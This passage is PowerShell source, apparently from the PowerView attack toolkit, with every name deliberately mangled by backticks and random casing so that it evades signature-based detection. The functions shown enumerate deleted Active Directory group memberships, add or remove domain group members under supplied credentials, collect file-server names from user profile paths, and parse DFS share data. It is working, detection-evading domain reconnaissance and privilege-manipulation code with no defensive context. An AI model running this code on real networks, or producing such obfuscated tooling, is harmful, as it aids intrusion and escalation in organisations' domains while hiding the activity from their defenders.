                    ${g`RoUpm`EMb`Er} | add-`mEm`BEr n`O`Te`ProPErTY 'MemberDistinguishedName' ${mEM`BeR`dn}
                    ${gr`oupM`E`mbER} | A`Dd`-`Member n`OTEpr`oPeR`Ty 'MemberObjectClass' ${mEmb`e`RObj`E`cT`CLaSS}
                    ${gr`o`UpM`emBer} | add`-ME`m`BeR nOtEpRO`P`e`Rty 'MemberSID' ${Mem`BER`sid}
                    ${grou`pMeMB`Er}.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    ${G`RoUpM`E`MbER}

                    
                    if (${PSB`oUn`d`Pa`R`AMetErS}['Recurse'] -and ${ME`MbE`RDn} -and (${Mem`BE`Rob`jec`Tc`lAss} -match 'group')) {
                        W`R`I`TE-VerBoSe "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        ${Se`ARcheRargU`M`ents}['Identity'] = ${meM`B`erDn}
                        ${nU`ll} = ${S`eARChEra`Rgum`entS}.Remove('Properties')
                        g`Et-DoMainGrO`UpmE`mB`Er @SearcherArguments
                    }
                }
            }
            ${GrOup`sea`Rc`H`ER}.dispose()
        }
    }
}


function g`Et-dOMaiN`G`RoupMem`BErDEL`eteD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${Id`en`TItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MaIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ld`ApFil`T`eR},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`E`ARchb`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sERv`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sE`ARChS`c`opE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`E`sULTp`AgEsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`e`RVERtimELIMiT},

        [Switch]
        ${to`mB`St`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`d`eNTIaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SEARCH`ERarg`U`mENts} = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   ${t`RuE}
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if (${psbO`UN`DPA`Ram`et`Ers}['Domain']) { ${sEa`Rc`hE`RaRG`Um`ENTS}['Domain'] = ${DoM`A`In} }
        if (${psBo`Un`DPAR`Amet`eRS}['LDAPFilter']) { ${SE`A`RcHERa`RGum`ents}['LDAPFilter'] = ${LDa`pFi`lT`ER} }
        if (${psboUN`DP`A`RA`mE`TERs}['SearchBase']) { ${SEARC`h`erArg`UmeNtS}['SearchBase'] = ${SEA`RcH`BasE} }
        if (${PS`BoUND`paramete`RS}['Server']) { ${searcHEr`ARG`UMe`N`Ts}['Server'] = ${SERv`Er} }
        if (${Ps`BOUNDP`ARAMe`T`ERs}['SearchScope']) { ${SEARCHe`Rar`gU`M`E`NtS}['SearchScope'] = ${se`A`Rch`scope} }
        if (${pSb`oU`Nd`parAMe`T`ERS}['ResultPageSize']) { ${seA`RChE`R`ARgu`m`EntS}['ResultPageSize'] = ${REs`ULT`p`Ag`eSIzE} }
        if (${pSb`OuND`parAM`eterS}['ServerTimeLimit']) { ${S`earCHeRa`RgUm`eN`TS}['ServerTimeLimit'] = ${s`ER`VErT`imelimIt} }
        if (${pS`BO`UndPAram`eteRS}['Tombstone']) { ${Searc`H`ErargUMEN`TS}['Tombstone'] = ${tombST`O`Ne} }
        if (${psBoundPa`R`Ame`TErS}['Credential']) { ${S`eaRch`eRAr`GUMenTs}['Credential'] = ${CrE`DENt`ial} }
    }

    PROCESS {
        if (${Psb`o`UndpArAM`E`TErS}['Identity']) { ${se`ARChEra`Rgu`MEN`TS}['Identity'] = ${i`D`EN`TIty} }

        GeT`-`DOma`I`NobjECt @SearcherArguments | foR`e`ACH`-objE`CT {
            ${O`B`JEcTDn} = ${_}.Properties['distinguishedname'][0]
            ForEach(${xmlN`oDe} in ${_}.Properties['msds-replvaluemetadata']) {
                ${TemP`o`B`jecT} = [xml]${XM`L`Node} | seLECT`-`Ob`jecT -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction siLE`NtlYcoNti`N`Ue
                if (${tE`mPO`BJ`ect}) {
                    if ((${Te`MP`ObjECt}.pszAttributeName -Match 'member') -and ((${T`e`MP`OBJeCt}.dwVersion % 2) -eq 0 )) {
                        ${Outp`Ut} = nE`w`-oB`JecT pSObJE`ct
                        ${out`pUt} | Ad`D-mEMb`ER no`Te`PROpeRTY 'GroupDN' ${o`BjECt`dN}
                        ${ou`TP`Ut} | aDD-m`Em`Ber N`OTepro`PEr`TY 'MemberDN' ${TEm`POb`J`Ect}.pszObjectDn
                        ${O`U`Tput} | a`Dd-mEM`Ber noT`e`pro`pertY 'TimeFirstAdded' ${tE`mpoB`jEcT}.ftimeCreated
                        ${o`U`TpUT} | aD`d-`m`EMBeR nO`Te`pROP`ERtY 'TimeDeleted' ${TE`m`POBJE`cT}.ftimeDeleted
                        ${OU`TP`Ut} | ADd`-m`emBER NOteP`RoP`Er`TY 'LastOriginatingChange' ${teM`po`B`JeCt}.ftimeLastOriginatingChange
                        ${o`U`TpUt} | aDd-ME`m`BeR nOtEpRo`pe`RTy 'TimesAdded' (${TE`MpO`BjECT}.dwVersion / 2)
                        ${ou`Tp`Ut} | Add-m`e`Mber n`oTe`pRope`RtY 'LastOriginatingDsaDN' ${TEmp`oB`J`ect}.pszLastOriginatingDsaDN
                        ${O`UtpuT}.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        ${out`PUt}
                    }
                }
                else {
                    w`RItE`-VErbosE "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function add-domA`iNG`R`ouPmEM`Ber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${Tr`Ue})]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        ${I`DeN`TITy},

        [Parameter(Mandatory = ${tr`UE}, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${memB`E`Rs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`M`Ain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`dE`NTiAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${C`o`NT`exTaRgUM`eNTs} = @{
            'Identity' = ${id`eNt`iTy}
        }
        if (${ps`B`OuND`PAr`Am`etErS}['Domain']) { ${c`OnTExt`Ar`gUmENts}['Domain'] = ${doM`Ain} }
        if (${PS`BO`UnDpaRAm`ETERS}['Credential']) { ${CoNT`EXta`R`Gum`EnTS}['Credential'] = ${CR`EDE`Nt`IAl} }

        ${Gr`OuP`Co`N`TeXt} = ge`T`-priN`c`IPalC`ON`TExt @ContextArguments

        if (${G`RO`U`Pc`ONText}) {
            try {
                ${g`Roup} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${gROupC`o`N`TeXT}.Context, ${gRoupC`O`NT`eXt}.Identity)
            }
            catch {
                wRI`TE-waRn`inG "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if (${gro`Up}) {
            ForEach (${me`mbEr} in ${ME`mbERS}) {
                if (${m`eM`BeR} -match '.+\\.+') {
                    ${CoN`T`EXtARgum`eNTS}['Identity'] = (${MeMb`ER} -split '\\')[1]
                    ${conText`A`RG`UMeNts}['Domain'] = (${MEM`BeR} -split '\\')[0]
                    ${US`e`RCo`NTeXT} = get`-p`R`incip`AL`ContExt @ContextArguments
                    if (${use`RcoN`T`Ext}) {
                        ${U`S`eride`NTiTy} = ${USErC`on`TE`xT}.Identity
                    }
                }
                else {
                    ${UsERC`o`NtExT} = ${gR`oUpc`ONtexT}
                    ${U`Seride`NtITY} = ${MEMb`eR}
                }
                wrItE-vE`RBO`Se "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                ${m`EM`Ber} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${UsErco`N`TEXT}.Context, ${u`SEr`i`de`NTIty})
                ${g`ROUp}.Members.Add(${mEm`B`er})
                ${g`RoUp}.Save()
            }
        }
    }
}


function RemOVe-`domAINg`Ro`UpME`m`B`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`UE})]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        ${id`ENTI`TY},

        [Parameter(Mandatory = ${Tr`Ue}, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${Memb`ERs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`eNT`iAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${COn`TEXtaRG`U`Men`Ts} = @{
            'Identity' = ${i`de`NtIty}
        }
        if (${PSb`oUnDpA`R`AMetE`RS}['Domain']) { ${Co`NtEXt`A`RgUme`NtS}['Domain'] = ${DOM`AiN} }
        if (${pSB`o`UN`dpaRaMET`ers}['Credential']) { ${cONt`exTA`Rgu`mEn`TS}['Credential'] = ${cre`d`enTiAL} }

        ${g`Ro`Up`COnt`EXt} = GET-`pRiNCi`palcoNT`E`Xt @ContextArguments

        if (${grOuPc`o`NTEXT}) {
            try {
                ${Gro`Up} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${gro`UPcoNt`E`xt}.Context, ${gRoUPcO`NT`EXT}.Identity)
            }
            catch {
                w`R`ITe`-wARNi`NG "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if (${G`R`oUP}) {
            ForEach (${M`e`mber} in ${M`emBe`Rs}) {
                if (${M`Emb`er} -match '.+\\.+') {
                    ${C`ONTex`TarGu`M`EntS}['Identity'] = ${ME`MbER}
                    ${usE`R`CoN`TeXt} = GeT-prInc`ipAl`cONt`e`xt @ContextArguments
                    if (${U`s`ErcOnT`EXt}) {
                        ${U`sE`Ride`NTiTy} = ${U`SeRc`ONT`eXt}.Identity
                    }
                }
                else {
                    ${u`sERco`NtEXT} = ${gR`OU`pcoNte`xT}
                    ${uS`eR`iDeNtiTY} = ${mEM`B`ER}
                }
                W`R`i`Te-vErbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                ${me`mB`er} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${uSerCo`N`Te`xt}.Context, ${US`eri`DeNtiTY})
                ${G`ROup}.Members.Remove(${mE`mb`eR})
                ${G`R`ouP}.Save()
            }
        }
    }
}


function gET-DO`M`AiN`FILeS`ERVER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = ${t`Rue}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        ${DOM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`DAPFI`lTER},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`ARChBA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeR`V`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EaR`CHSc`OPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`s`ULtP`Agesi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRveRT`Im`e`Lim`IT},

        [Switch]
        ${TO`mBsto`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eden`TIal} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function s`P`lit-`patH {
            
            Param([String]${pa`TH})

            if (${p`ATh} -and (${p`ATh}.split('\\').Count -ge 3)) {
                ${T`eMP} = ${pa`TH}.split('\\')[2]
                if (${TE`mP} -and (${T`emP} -ne '')) {
                    ${T`eMP}
                }
            }
        }

        ${SeArche`RAr`GUm`en`Ts} = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if (${PSBOuNDP`A`R`AmETErS}['SearchBase']) { ${s`EAr`Che`RA`RGUMEnTs}['SearchBase'] = ${Sea`RcHb`A`sE} }
        if (${P`sboUnd`p`ARaMETeRs}['Server']) { ${SE`ARcHeR`ArgumE`N`TS}['Server'] = ${s`Er`VER} }
        if (${pS`BOU`NdPara`mE`Ters}['SearchScope']) { ${SEarcHE`R`Ar`GuM`ENTs}['SearchScope'] = ${SEa`RC`hScO`pe} }
        if (${psbOUNDpaRa`M`etE`RS}['ResultPageSize']) { ${sEaRC`h`e`RaRGUMentS}['ResultPageSize'] = ${RES`Ul`T`pagEs`ize} }
        if (${p`SB`O`UndPAr`AmeTERS}['ServerTimeLimit']) { ${S`eA`Rc`HeRARGumENts}['ServerTimeLimit'] = ${seRv`ERtiM`E`liMiT} }
        if (${psBoUndp`A`RA`MEte`Rs}['Tombstone']) { ${SeaRcHeR`A`Rg`UM`EnTs}['Tombstone'] = ${tOmBs`To`Ne} }
        if (${PSboU`ND`PAr`AME`TErS}['Credential']) { ${Se`ARcHer`AR`g`UMEnts}['Credential'] = ${c`R`eDEnTiAl} }
    }

    PROCESS {
        if (${psBo`U`NdParAme`T`eRS}['Domain']) {
            ForEach (${TA`RgE`TDoM`AIN} in ${do`MaiN}) {
                ${Sear`che`RaRg`UMEntS}['Domain'] = ${TaR`GET`D`omAIN}
                ${US`Er`sEAR`Cher} = gE`T-dOMai`NsEARc`hER @SearcherArguments
                
                $(ForEach(${uS`er`RES`UlT} in ${UseR`s`ea`RcH`er}.FindAll()) {if (${UsER`R`E`suLT}.Properties['homedirectory']) {sp`Lit-`pAth(${usER`Re`sUlT}.Properties['homedirectory'])}if (${uS`eRRE`SulT}.Properties['scriptpath']) {S`plit`-PAtH(${usE`Rre`Su`lt}.Properties['scriptpath'])}if (${U`SerReSU`lt}.Properties['profilepath']) {SpL`IT-PA`TH(${u`SE`RResUlt}.Properties['profilepath'])}}) | S`or`T-OBJEcT -Unique
            }
        }
        else {
            ${UsE`RsE`ARChEr} = GEt-Do`MaINsEAR`C`hER @SearcherArguments
            $(ForEach(${US`Er`REsuLT} in ${uSeR`s`EarC`HeR}.FindAll()) {if (${use`RRE`SU`lT}.Properties['homedirectory']) {sPL`IT`-`PAtH(${u`s`erresU`Lt}.Properties['homedirectory'])}if (${U`SE`RReS`Ult}.Properties['scriptpath']) {sP`lI`T-`PATh(${u`SErr`eSu`LT}.Properties['scriptpath'])}if (${uS`eRRe`S`Ult}.Properties['profilepath']) {sp`Lit-PA`TH(${uSERre`S`U`lt}.Properties['profilepath'])}}) | sORt`-oB`JECt -Unique
        }
    }
}


function geT-`DOMA`inD`FSs`HARE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        ${DoM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEaR`C`HbASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`e`RveR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`E`ARch`ScOpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSU`lTpa`ge`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ervERTi`MEL`IMit},

        [Switch]
        ${t`om`BST`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edEnTI`AL} = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${v`ERsiOn} = 'All'
    )

    BEGIN {
        ${s`E`Arch`ERarGUmENTS} = @{}
        if (${PsBOundPARAM`eT`e`RS}['SearchBase']) { ${s`e`ArCHera`RgumeNtS}['SearchBase'] = ${S`EarCHB`ASE} }
        if (${p`Sbou`NDp`AramET`Ers}['Server']) { ${s`eaRcH`erARgUME`NtS}['Server'] = ${S`E`RvER} }
        if (${pSB`oUnD`pA`R`AMeT`erS}['SearchScope']) { ${Sea`RCheRa`RGUm`E`N`TS}['SearchScope'] = ${sea`RChsC`OPE} }
        if (${P`SbOundparA`MeT`ers}['ResultPageSize']) { ${SEa`R`CHerar`gum`entS}['ResultPageSize'] = ${rESU`LTpAGe`S`I`Ze} }
        if (${psbounD`P`A`RaMe`TeRS}['ServerTimeLimit']) { ${sEa`RChER`ARGuMe`N`TS}['ServerTimeLimit'] = ${servERti`me`l`im`iT} }
        if (${PSbo`Und`par`AmeTeRs}['Tombstone']) { ${SEa`RChE`RA`RGUme`NTs}['Tombstone'] = ${tOM`BstO`NE} }
        if (${PS`BoUnd`PAR`AmETERs}['Credential']) { ${s`EaR`c`heraR`gUMeNts}['Credential'] = ${CR`Ed`Ential} }

        function p`ARse-`pKT {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${p`kt}
            )

            ${b`In} = ${p`kt}
            ${BLoB_v`Er`SI`oN} = [bitconverter]::ToUInt32(${B`iN}[0..3],0)
            ${B`Lo`B`_EL`EMenT_count} = [bitconverter]::ToUInt32(${B`iN}[4..7],0)
            ${of`FSeT} = 8
            
            ${objeCT`_LI`ST} = @()
            for(${I}=1; ${i} -le ${BL`oB_`E`lemENT_Cou`Nt}; ${i}++){
                ${BLO`B_n`AM`e_sizE_s`T`A`Rt} = ${oF`FS`ET}
                ${bl`OB`_NAMe_sizE`_EnD} = ${oFF`S`Et} + 1
                ${bloB_N`AM`E`_`SiZE} = [bitconverter]::ToUInt16(${b`in}[${blOB_`NAme_`si`Ze_`sT`ArT}..${bLob`_`NAM`E`_size`_enD}],0)

                ${BLoB_nAME_`s`T`A`RT} = ${bL`ob_`Na`ME_sIze_E`ND} + 1
                ${bL`ob_`NAmE`_End} = ${BLo`B`_Name_S`TaRt} + ${blob`_NaMe`_S`IZe} - 1
                ${BLob`_N`Ame} = [System.Text.Encoding]::Unicode.GetString(${b`In}[${BL`ob_`N`Am`E_start}..${blo`B_N`A`ME_e`ND}])

                ${b`Lo`B`_d`ATA_`SIZE_STArt} = ${BlO`B_`Nam`E_E`Nd} + 1
                ${bLOb`_Data_S`IZ`E_eND} = ${B`LO`B_`DatA_sIzE`_S`TaRT} + 3
                ${B`lOB_dA`T`A_SIzE} = [bitconverter]::ToUInt32(${B`In}[${bLoB_`DaTA`_s`iZ`e_stART}..${BL`oB_daTA_`SIZ`e_enD}],0)

                ${BLo`B`_`DAtA_stArT} = ${blOb_D`ATA`_s`izE_e`ND} + 1
                ${BLOb_D`ATa_`E`Nd} = ${b`L`ob_DaTa_STa`RT} + ${Bl`ob_dA`T`A_s`IZe} - 1
                ${bL`ob_`d`AtA} = ${b`iN}[${B`loB_Data`_`ST`ARt}..${BL`Ob`_Da`Ta_eNd}]
                switch -wildcard (${BL`O`B_nAmE}) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        
                        
                        ${R`O`OT_OR_lI`Nk_GUI`D_sta`RT} = 0
                        ${RoOt`_Or_`Link`_gUID`_end} = 15
                        ${RooT_O`R_LIN`k_G`U`Id} = [byte[]]${BlOb_d`A`TA}[${roo`T`_`OR_LINK_Gu`ID_StaRt}..${R`O`Ot`_Or_lINk_gu`id`_e`Nd}]
                        ${gU`ID} = new-o`BjE`Ct G`Uid(,${root_oR`_L`INk_g`UID}) 
                        ${Pr`eFIX_`sIzE_s`Ta`Rt} = ${root`_OR_LIN`K`_GUi`D_enD} + 1
                        ${pREF`ix_s`i`Ze_`e`Nd} = ${p`R`e`FiX`_size_START} + 1
                        ${p`RefIX_`SizE} = [bitconverter]::ToUInt16(${bL`oB_`DATA}[${pREfi`X_Size_`s`TA`Rt}..${PrE`F`IX_SiZE`_END}],0)
                        ${pre`F`iX`_sT`ARt} = ${P`RefI`x_siZE`_e`Nd} + 1
                        ${P`RE`FI`X_End} = ${prEFIX`_sTa`Rt} + ${PRefiX`_`Si`ze} - 1
                        ${PREF`Ix} = [System.Text.Encoding]::Unicode.GetString(${Bl`oB_DA`TA}[${P`R`efI`x_sTaRt}..${prEf`Ix`_eND}])

                        ${SHorT`_pReFI`X_sI`ZE_s`TART} = ${PreFi`X`_eND} + 1
                        ${shOrT_pR`E`F`Ix_`sIzE_e`ND} = ${sH`ORt`_`PREfIx`_sIZE_STARt} + 1
                        ${sh`ORt_p`R`EF`ix_Si`zE} = [bitconverter]::ToUInt16(${Blo`B_d`ATa}[${SHO`Rt_pre`FIx_`S`iZe_sT`Art}..${shOR`T_`PREF`IX_S`iZe`_E`Nd}],0)
                        ${shO`R`T_pREFiX`_ST`A`RT} = ${sHoRt_PRE`Fi`X_`SIZe_e`Nd} + 1
                        ${s`hOrT`_Pr`EFIx`_`eNd} = ${shor`T`_PRefIX`_`StA`Rt} + ${sHort_Pr`efI`X`_sI`ze} - 1
                        ${SH`oRT_preF`iX} = [System.Text.Encoding]::Unicode.GetString(${BL`oB_`DAta}[${shoRT_`pR`EF`iX`_s`TArt}..${SHOr`T_`pREFix_`E`ND}])

                        ${tYPe`_`s`TaRT} = ${ShOrt`_`pRe`FiX_end} + 1
                        ${tY`p`E_E`Nd} = ${T`YPe_sT`Art} + 3
                        ${t`yPe} = [bitconverter]::ToUInt32(${B`l`OB_DaTa}[${tYPe_`s`TArT}..${TYp`E_END}],0)

                        ${s`TAte`_`Start} = ${tyPE`_end} + 1
                        ${S`TA`Te_end} = ${St`A`Te_St`ArT} + 3
                        ${S`TA`Te} = [bitconverter]::ToUInt32(${bLOB_D`A`Ta}[${ST`Ate_Sta`RT}..${sTaTe_`e`Nd}],0)

                        ${C`OMMenT_SI`zE_`St`ARt} = ${stAt`e_E`Nd} + 1
                        ${cOMMent`_sizE`_`END} = ${Com`mEnT`_SIze_S`Tart} + 1
                        ${co`m`M`eN`T_SiZe} = [bitconverter]::ToUInt16(${B`loB_d`ATa}[${Co`MMenT`_SiZE_STA`RT}..${c`OM`MenT`_SiZE`_ENd}],0)
                        ${comMenT`_`ST`ART} = ${c`O`M`Ment_SiZ`E_EnD} + 1
                        ${c`omm`enT`_enD} = ${c`OmmEnt_`s`TArT} + ${COmMent`_SI`Ze} - 1
                        if (${Comm`ent`_SIze} -gt 0)  {
                            ${Co`mm`eNT} = [System.Text.Encoding]::Unicode.GetString(${blOb_d`A`Ta}[${cOmM`eNt_s`TART}..${co`m`MeNT_eND}])
                        }
                        ${P`Refix_t`ImEST`Amp`_sTaRt} = ${comMe`Nt`_eNd} + 1
                        ${preF`iX_ti`m`EsTAmP_e`Nd} = ${PRefIX_TImeSTAmP`_`S`TA`RT} + 7
                        
                        ${PR`e`Fi`x_TIMesta`Mp} = ${b`l`Ob_DAtA}[${P`RefIx_`Time`sTAMP`_starT}..${PREFix_`T`i`MeST`AM`p_ENd}] 
                        ${staTe_ti`me`s`TaMP_st`ARt} = ${P`Ref`IX`_`TImEstamP_eNd} + 1
                        ${Sta`T`e_TimESTAm`p_E`Nd} = ${s`Tat`e_tiM`ES`Tamp`_`staRT} + 7
                        ${St`AT`e_`TimesTAmP} = ${B`loB_d`ATA}[${s`TaTe_Tim`Es`TAM`p_STaRt}..${StA`T`E_tImeSt`Amp_enD}]
                        ${COmmeN`T_`TimE`Stam`p`_St`Art} = ${S`TAt`E_tiM`estAmP_END} + 1
                        ${cOM`mE`N`T_Tim`e`Stamp`_EnD} = ${c`OmMeN`T_Tim`E`s`TamP`_sTarT} + 7
                        ${COmm`ENt_`TiMe`sTAmP} = ${bLO`B_`DATA}[${comMeNT`_tIME`sT`Amp_s`TARt}..${CO`mmEnt_`TI`mesT`AMP_eND}]
                        ${Ve`RSI`on_`STArt} = ${Co`MMEnt_`TiMe`sTam`p_END}  + 1
                        ${vERs`IOn_E`ND} = ${VERsi`o`N_STaRt} + 3
                        ${vErs`iOn} = [bitconverter]::ToUInt32(${blob`_`dAta}[${ve`RsIOn_`S`TaRt}..${v`ERsIOn`_e`Nd}],0)

                        
                        ${Dfs`_`TAr`GEtliST_bLob_S`IZe`_`StArT} = ${vE`Rs`i`on_End} + 1
                        ${DF`S_ta`RGe`Tl`isT_blO`B_`SIzE_end} = ${DFs_ta`R`geTlIS`T_b`l`OB_s`IZE_S`Tart} + 3
                        ${dFS_Ta`RGe`T`LI`st`_blo`B_SiZE} = [bitconverter]::ToUInt32(${bl`Ob_d`AtA}[${DFS_t`AR`GEtLisT_BLob`_`SIzE`_sTa`RT}..${df`S_`TaRgetL`IsT`_Blo`B`_`s`iZe_end}],0)

                        ${df`s_T`A`R`GeTLi`ST_`BLob`_staRt} = ${DfS_tar`getl`ist_blOb_s`Ize_`E`ND} + 1
                        ${D`Fs_ta`R`GEtlisT_b`l`oB_eNd} = ${DF`s_`TARgETlI`st`_`BLo`B_St`ART} + ${DfS_TargeTliS`T_B`L`O`B_`S`ize} - 1
                        ${d`FS_taR`GETliS`T`_bl`oB} = ${bLoB_`dA`Ta}[${dFS_TarGET`lIST_`B`l`OB_s`Tart}..${d`FS_ta`RG`etlISt_bL`o`B`_ENd}]
                        ${reSE`R`Ve`d_bL`ob_siz`E`_st`Art} = ${D`Fs_`TaRG`E`T`LIS`T`_blOb_ENd} + 1
                        ${RE`sERvE`d_`Bl`Ob_`siZe_`ENd} = ${R`Es`ER`Ved_bl`OB`_S`i`ZE_StArt} + 3
                        ${RE`sE`RVE`d`_B`l`OB_size} = [bitconverter]::ToUInt32(${bLO`B_Da`Ta}[${rESerVed_Blob_`s`i`Ze_sTA`RT}..${R`eSE`RV`e`d_`BloB_`siZE_E`Nd}],0)

                        ${ReS`eRVE`d_b`l`o`B_sTARt} = ${rEservE`d_B`lOb_sIZ`E`_eND} + 1
                        ${R`eSerVe`d_bl`Ob_EnD} = ${rEsErV`eD_BloB_ST`A`Rt} + ${R`ese`RVE`D`_BLOb_S`ize} - 1
                        ${r`E`SE`RvEd_b`lob} = ${BloB_`d`A`Ta}[${R`e`s`Er`VED_bloB_sTArt}..${Reserv`e`D`_b`l`Ob_eNd}]
                        ${REFeRR`AL_Tt`l`_`STaRt} = ${REsER`VEd`_blO`B_EnD} + 1
                        ${RE`FE`RRa`L_`TTl_End} = ${ReFE`Rr`Al_ttl`_sTA`Rt} + 3
                        ${Re`Fe`RRaL`_tTl} = [bitconverter]::ToUInt32(${blO`B`_da`Ta}[${rEFerR`AL_`Ttl_s`TaRt}..${r`eFE`R`RA`l_t`TL_eND}],0)

                        
                        ${TarGEt_co`Un`T_`S`T`Art} = 0
                        ${tAr`GET`_`cOUN`T`_enD} = ${taRG`e`T_`cO`Unt_stArT} + 3
                        ${ta`R`ge`T_c`ounT} = [bitconverter]::ToUInt32(${dfs`_Target`LI`S`T_bLOb}[${tArGE`T_`coUN`T_S`TART}..${tArge`T`_CO`UNt_eNd}],0)
                        ${t_`of`Fset} = ${t`Ar`GeT_`cOU`N`T_enD} + 1

                        for(${J}=1; ${J} -le ${Ta`RG`ET_`C`oUNT}; ${j}++){
                            ${T`A`Rget`_EnT`Ry_Size`_sTArt} = ${T`_oFfS`ET}
                            ${T`A`R`Get_ent`Ry_sIZ`e_e`ND} = ${TAR`gET_ENtry_SI`z`E_st`A`Rt} + 3
                            ${TARgEt_`eNtR`Y_`S`Ize} = [bitconverter]::ToUInt32(${Dfs`_TARGEtliSt`_bl`oB}[${TARgeT_EN`TrY_SI`z`e_st`ArT}..${tARG`eT_EntR`y`_SizE`_END}],0)
                            ${TArGE`T_`Ti`mE_STamP_s`TARt} = ${Ta`RG`Et_EN`Tr`Y_sIzE`_End} + 1
                            ${T`ArgET_t`imE_ST`A`M`p_End} = ${t`ArGeT_`Tim`e_StamP_`s`TArt} + 7
                            
                            ${TA`RG`ET_TiME_sT`AMp} = ${DfS`_T`Ar`GetLiST_`BLob}[${tar`GeT_`Time_STAM`p_s`TaRT}..${tArge`T_time`_st`Am`p_eNd}]
